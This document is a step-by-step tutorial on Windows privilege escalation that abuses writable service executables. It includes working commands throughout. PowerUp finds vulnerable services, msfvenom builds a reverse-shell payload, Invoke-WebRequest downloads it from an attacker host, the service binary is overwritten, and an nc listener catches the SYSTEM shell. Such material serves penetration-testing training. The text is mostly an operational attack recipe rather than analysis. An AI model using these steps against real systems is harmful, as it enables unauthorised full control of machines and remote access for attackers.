**Insecure service permissions** in Windows can allow local privilege escalation if a low-privileged user can modify or replace the executable of a service running with SYSTEM privileges. This technique involves identifying misconfigured services, verifying write permissions, replacing the service binary with a malicious payload, and restarting the service to gain elevated access.

---

## 1. Enumerate Vulnerable Services

Use `PowerUp` or similar tools to find services with weak permissions.

```powershell
# Run PowerUp to find vulnerable services
Invoke-AllChecks
```

Look for output like:

```
ModifiableService - Name: VulnService - Path: C:\Program Files\VulnService\service.exe
```

---

## 2. Verify Permissions on the Service Executable

Check if your user has write access to the service binary.

```powershell
# Check permissions on the service executable
icacls "C:\Program Files\VulnService\service.exe"
```

Look for something like:

```
BUILTIN\Users:(I)(F)
```

This means users can **fully control** the file.

---

## 3. Generate a Malicious Payload with msfvenom

On your Kali machine, create a reverse shell payload named exactly like the service executable.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o service.exe
```

Replace `YOUR_IP` and `YOUR_PORT` with your Kali listener details.

---

## 4. Transfer the Payload to the Windows Machine

Use SMB, Python HTTP server, or any file transfer method.

```bash
# Example using Python HTTP server
python3 -m http.server 8080
```

On Windows (PowerShell):

```powershell
Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/service.exe" -OutFile "C:\Program Files\VulnService\service.exe"
```

---

## 5. Replace the Original Executable

Overwrite the existing service binary with your payload.

```powershell
# Backup original (optional)
Copy-Item "C:\Program Files\VulnService\service.exe" "C:\Program Files\VulnService\service_backup.exe"

# Replace with malicious payload
Copy-Item "C:\Users\Public\service.exe" "C:\Program Files\VulnService\service.exe" -Force
```

---

## 6. Restart the Service

Trigger the service to run your payload.

```powershell
# Restart the vulnerable service
Restart-Service -Name "VulnService"
```

---

## 7. Catch the Reverse Shell

On Kali, start your listener:

```bash
nc -lvnp YOUR_PORT
```

Once the service restarts, you should receive a shell with SYSTEM privileges.
